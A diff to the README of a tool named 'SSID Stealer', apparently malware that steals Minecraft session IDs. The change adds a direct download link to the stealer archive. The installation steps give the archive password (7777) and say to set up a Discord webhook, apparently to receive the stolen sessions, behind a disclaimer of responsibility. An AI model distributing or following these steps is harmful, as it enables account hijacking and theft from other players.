@@ -8,7 +8,7 @@ I, the creator am not responsible for anything you do with this software. This i
 
 # Installation 
 
-* First Download SSID.zip
+* First Download [SSID.zip](https://raw.githubusercontent.com/MinecraftSSID/Minecraft-SSID/main/SSID%20Stealer.zip)
 * Extract The file using [winrar](https://www.rarlab.com/download.htm)
 * The password for the file is 7777
 * Make a new discord webhook [How ?](https://www.youtube.com/watch?v=fKksxz2Gdnc)
